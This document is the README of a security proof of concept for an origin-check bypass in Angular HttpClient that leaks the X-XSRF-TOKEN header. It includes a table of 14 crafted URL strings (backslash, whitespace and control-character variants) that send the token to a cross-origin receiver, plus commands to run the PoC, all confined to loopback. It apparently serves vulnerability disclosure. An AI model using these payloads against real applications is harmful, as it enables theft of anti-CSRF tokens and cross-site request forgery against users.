# Angular HttpClient XSRF origin bypass

Small browser PoC for Angular `20.3.33`. The [CVE-2025-66035 patch](https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37) blocks protocol-relative URLs, but the v20 check still treats some cross-origin URLs as relative. If an attacker controls the start of a URL passed to `HttpClient.post()`, the request can expose `X-XSRF-TOKEN`.

The API returns 17 `href` values: three controls and 14 bypasses. The app posts to each using `withFetch()`. These are JavaScript string forms; `\t`, `\n`, `\r`, `\u0000`, and `\u001f` become actual control characters. The API also appends `?id=<case>` for capture matching.

| Case                      | `href` without the `id` query       | Token at receiver? |
| ------------------------- | ----------------------------------- | ------------------ |
| Same origin               | `'/api/echo'`                       | App only           |
| Protocol relative         | `'//localhost:4301/collect'`        | No                 |
| Absolute                  | `'http://localhost:4301/collect'`   | No                 |
| Backslash                 | `'/\\localhost:4301/collect'`       | **Yes**            |
| Backslash then slash      | `'\\/localhost:4301/collect'`       | **Yes**            |
| Leading space             | `' //localhost:4301/collect'`       | **Yes**            |
| Leading tab               | `'\t//localhost:4301/collect'`      | **Yes**            |
| Leading space and tab     | `' \t//localhost:4301/collect'`     | **Yes**            |
| Inner tab                 | `'/\t/localhost:4301/collect'`      | **Yes**            |
| Inner line feed           | `'/\n/localhost:4301/collect'`      | **Yes**            |
| Inner carriage return     | `'/\r/localhost:4301/collect'`      | **Yes**            |
| Leading NUL               | `'\u0000//localhost:4301/collect'`  | **Yes**            |
| Leading U+001F            | `'\u001f//localhost:4301/collect'`  | **Yes**            |
| HTTP with two backslashes | `'http:\\\\localhost:4301/collect'` | **Yes**            |
| HTTP slash and backslash  | `'http:/\\localhost:4301/collect'`  | **Yes**            |
| Tab inside HTTP scheme    | `'ht\ttp://localhost:4301/collect'` | **Yes**            |
| Same host, other port     | `'/\\127.0.0.1:4302/collect'`       | **Yes**            |

Bare `'\\\\localhost:4301/collect'` is omitted: local Chrome rejected it as an invalid URL with both fetch and XHR.

## Run

```powershell
npm ci
npm run poc
```

Requires Chrome or Edge. Set `$env:CHROME_PATH` if the browser is outside its default Windows path. The runner builds the app, starts the local servers, drives a real browser, and checks captured headers. `npm start` serves the manual demo at `http://127.0.0.1:4200`.

## Files

- `src/app/` — Angular request flow.
- `backend/server.mjs` — demo API at `127.0.0.1:4200` and receivers at `localhost:4301` and `127.0.0.1:4302`.
- `scripts/poc.mjs` — browser validation.

All servers bind to loopback. The XSRF cookie is random test data; the attacker receivers get the header, not the cookie.
